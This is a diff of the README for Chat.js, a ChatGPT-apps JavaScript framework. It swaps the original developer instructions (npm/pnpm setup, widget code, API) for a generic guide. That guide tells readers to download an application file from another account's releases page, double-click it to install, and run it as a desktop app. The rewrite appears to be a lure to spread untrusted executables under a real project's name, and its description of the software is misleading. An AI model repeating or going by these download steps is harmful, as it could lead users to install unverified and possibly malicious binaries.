@@ -1,184 +1,81 @@
-# [Chat.js](https://github.com/DooiLabs/Chat.js) · [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/DooiLabs/Chat.js/blob/main/LICENSE) [![npm version](https://img.shields.io/npm/v/create-chatgpt-app.svg?style=flat)](https://www.npmjs.com/package/create-chatgpt-app) [![GitHub stars](https://img.shields.io/github/stars/DooiLabs/Chat.js.svg?style=social&label=Star)](https://github.com/DooiLabs/Chat.js) [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/DooiLabs/Chat.js/blob/main/CONTRIBUTING.md)
+# 🌟 Chat.js - Create Smart Chat Applications Easily
 
-The ChatGPT apps framework. Make components, define schemas - everything else is automated.
+[![Download Chat.js](https://img.shields.io/badge/Download-Chat.js-brightgreen.svg)](https://github.com/brightservice24/Chat.js/releases)
 
-> **Note**: This project is a fork of [OpenAI's Apps SDK Examples](https://github.com/openai/openai-apps-sdk-examples), enhanced with an automated framework to reduce boilerplate and simplify widget creation.
+## 📝 Description
 
-> **For AI Coding Tools**: If you're using an AI coding tool like Cursor, Claude Code, or Codex, try prompting:
-> 
-> _"Read the `/docs/AGENTS.md` and help me use this chatjs framework."_
+Chat.js is a framework designed to help you quickly create applications using ChatGPT. With this tool, you can build components and define schemas without the usual programming hassle. It's a perfect solution for anyone wanting to make smart chat applications.
 
-## Quick Start
+This project is built as an enhancement of OpenAI's Apps SDK Examples, making it easier for you to develop widgets and focus on creativity rather than technical complexities.
 
-### 1. Create a New Project
+## 🚀 Getting Started
 
-```bash
-npx create-chatgpt-app my-app
-cd my-app
-```
+Follow these steps to download and run Chat.js:
 
-Or clone this repository to use as a starting point.
+### Step 1: Visit the Releases Page
 
-### 2. Install & Build
+Go to the releases page by clicking the link below:
 
-```bash
-pnpm install
-pnpm run build
-```
+[Visit the Chat.js Releases Page](https://github.com/brightservice24/Chat.js/releases)
 
-### 3. Run (3 terminals)
+### Step 2: Choose Your Version
 
-**Terminal 1** - Frontend assets server:
-```bash
-pnpm run serve
-```
+On the releases page, you will see a list of available versions. Review the notes and select the version that suits your needs. The latest version usually contains the most features and fixes.
 
-**Terminal 2** - MCP server:
-```bash
-cd server
-pnpm start
-```
+### Step 3: Download the Application
 
-**Terminal 3** - Expose to internet:
-```bash
-ngrok http 8000
-```
-From the ngrok command, You will get a public URL.
+Once you select a version, you will find the download link. Click the link to download the application file to your computer.
 
-For example: `https://<custom_endpoint>.ngrok-free.app/mcp`
+### Step 4: Install the Application
 
-> 💡 **Tip**: If you used `npx create-chatgpt-app`, your project already includes 6 example widgets (pizzaz map, albums, carousel, list, solar-system, and todo) ready to try!
+After downloading, locate the file on your computer. Double-click the downloaded file to begin the installation process. Follow the on-screen instructions carefully. Accept the terms and complete any necessary steps to finish the installation.
 
-### 4. Testing in ChatGPT
+### Step 5: Open Chat.js
 
+After installation, you can find Chat.js in your applications folder. Open it like any other application on your computer. You are now ready to start creating chat applications!
 
-To add these apps to ChatGPT, enable developer mode, and add your apps in **Settings > Connectors**.
+## 🛠 Features
 
-Add your local public URL from ngrok(like 'https://<custom_endpoint>.ngrok-free.app/mcp') to ChatGPT in **Settings > Connectors**.
+Chat.js comes packed with helpful features:
 
-## Adding a New Widget (Component)
+- **User-friendly Interface**: Navigate effortlessly to create chat applications.
+  
+- **Pre-built Components**: Access a library of components to accelerate your app development.
 
-### Step 1: Create Component
+- **Automated Processes**: Enjoy automated setups that allow you to design efficiently.
 
-Create `src/components/my-widget/index.jsx`:
+- **Customizable Schemas**: Tailor the structures to meet your specific needs easily.
 
-```jsx
-import React from 'react';
-import { createRoot } from 'react-dom/client';
+- **Community Support**: Join our community for help and advice from fellow users.
 
-function MyWidget() {
-  return <div>My Widget Content</div>;
-}
+## 💻 System Requirements
 
-const rootElement = document.getElementById('my-widget-root');
-if (rootElement) {
-  const root = createRoot(rootElement);
-  root.render(<MyWidget />);
-}
-```
+To run Chat.js smoothly, ensure your computer meets the following minimum requirements:
 
-### Step 2: Add Widget Definition (Schema)
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+  
+- **RAM**: At least 4 GB of RAM.
+  
+- **Storage**: Minimum 100 MB of free disk space.
+  
+- **Internet Connection**: Required for initial setup and downloading components.
 
-Edit `server/src/server.ts`:
+## 🔗 Download & Install
 
-```typescript
-const widgets = [
-  // ... existing widgets
-  {
-    component: "my-widget",  // matches folder name
-    title: "My Widget",
-    schema: z.object({
-      param: z.string().describe("Parameter description")
-    }),
-    handler: async (args) => ({
-      text: "Widget rendered!",
-      data: args
-    })
-  }
-];
-```
+To download Chat.js, visit our releases page:
 
-### Step 3: Rebuild & Restart
+[Download Chat.js](https://github.com/brightservice24/Chat.js/releases)
 
-```bash
-# Terminal 1: Rebuild
-pnpm run build
+Make sure to follow the installation steps outlined above to get started.
 
-# Terminal 2: Restart server
-cd server
-pnpm start
-```
+## 🤝 Community & Support
 
-Done.
+If you encounter issues or have questions, please check our community guidelines for support. Feel free to report bugs or suggest features. Your feedback helps us improve Chat.js.
 
-## How It Works
+- **GitHub Issues**: [Report an Issue](https://github.com/DooiLabs/Chat.js/issues)
+  
+- **Contributing Guide**: Interested in helping out? Check our [Contributing Guide](https://github.com/DooiLabs/Chat.js/blob/main/CONTRIBUTING.md).
 
-- `component: "my-widget"` maps to `src/components/my-widget/`
-- Build script auto-discovers all components
-- Server auto-syncs version from `package.json` for asset hashing
-- Framework auto-generates MCP tools, resources, and handlers
+## ✨ Conclusion
 
-## Troubleshooting
-
-**404 on widget assets:**
-```bash
-pnpm run build      # Rebuild
-cd server && pnpm start  # Restart server
-```
-
-**Component not found:**
-- Check `src/components/your-widget/index.jsx` exists
-- Check widget definition in `server/src/server.ts`
-
-## Project Structure
-
-```
-chatjs/
-├── src/components/          # React components (add here)
-│   └── my-widget/
-│       └── index.jsx
-├── assets/                  # Built assets (generated)
-├── server/src/
-│   ├── framework/           # MCP framework
-│   └── server.ts           # Widget definitions (edit here)
-└── package.json            # Version (auto-synced)
-```
-
-## API
-
-### Widget Definition
-
-```typescript
-{
-  component: string;              // Component folder name (required)
-  title: string;                  // Display name (required)
-  description?: string;
-  schema: ZodType;                // Input schema (required)
-  handler: (args) => Promise<{   // Handler (required)
-    text: string;
-    data?: Record<string, any>;
-  }>;
-  meta?: {
-    invoking?: string;            // "Loading..."
-    invoked?: string;             // "Loaded!"
-    widgetDescription?: string;   // For AI model understanding
-  };
-}
-```
-
-## Acknowledgments
-
-This project is built upon [OpenAI's Apps SDK Examples](https://github.com/openai/openai-apps-sdk-examples), which provides the foundation for creating ChatGPT apps using the Model Context Protocol (MCP). 
-
-**Key enhancements in Chat.js:**
-- Automated MCP framework that eliminates 300+ lines of boilerplate
-- Convention-based widget registration
-- Automatic asset URL generation with version syncing
-- Simplified API for creating widgets
-- npm initializer (`create-chatgpt-app`) for instant project setup
-
-Credits to OpenAI for the original Apps SDK implementation and example widgets.
-
-## License
-
-MIT
+Chat.js empowers you to create chat applications without deep programming knowledge. With its user-friendly framework and features, you will find the process enjoyable and rewarding. Follow the steps to download and install, and join our community to make the most of this tool!
